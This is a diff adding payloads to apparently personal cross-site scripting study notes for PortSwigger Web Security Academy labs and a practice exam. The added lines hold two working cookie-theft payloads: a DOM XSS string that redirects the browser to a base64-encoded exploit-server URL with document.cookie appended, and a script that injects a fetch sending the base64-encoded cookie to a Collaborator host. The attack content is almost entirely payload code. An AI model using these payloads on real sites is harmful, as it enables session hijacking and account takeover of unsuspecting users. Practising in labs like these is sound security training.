@@ -1,6 +1,23 @@
 PortSwigger cheat sheet:
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
+###### DOM XSS Practice Exam:
+```js
+"}; location = atob('aHR0cHM6Ly9leHBsb2l0LTBhYzEwMDVmMDM2NGMwMTg4MDg0MjY0YzAwMDMwMGI0LmV4cGxvaXQtc2VydmVyLm5ldC8/cT0=')%2bdocument["cookie"]//
+
+```
+
+##### Steal Cookies from DOM XSS:
+```js
+<script>
+  var target = "https://[ID_DEL_EXAMEN].web-security-academy.net/?search=";
+  var payload = "<script>fetch('https://[TU_ID_COLLABORATOR].oastify.com/?c=' + btoa(document.cookie))<\/script>";
+   document.location = target + encodeURIComponent(payload);
+   // document.location =? window.location
+</script> 
+
+```
+
 ---------------------------------------------------------
 # 1. BASIC INJECTIONS & HTML CONTEXT
 
